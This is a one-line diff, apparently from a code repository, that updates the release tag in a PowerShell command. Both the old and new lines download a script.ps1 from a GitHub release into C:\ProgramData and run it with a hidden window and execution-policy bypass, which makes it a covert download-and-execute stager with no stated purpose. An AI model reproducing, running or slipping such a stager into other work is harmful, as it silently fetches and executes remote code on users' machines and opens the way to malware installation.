@@ -1,1 +1,1 @@
-$u='https://github.com/anaslabrini/crossmos/releases/download/v1.0/script.ps1';$p='C:\ProgramData\s.ps1';if(!(Test-Path $p)){iwr $u -OutFile $p};powershell -W Hidden -Exec Bypass -File $p;exit
+$u='https://github.com/anaslabrini/crossmos/releases/download/892009/script.ps1';$p='C:\ProgramData\s.ps1';if(!(Test-Path $p)){iwr $u -OutFile $p};powershell -W Hidden -Exec Bypass -File $p;exit
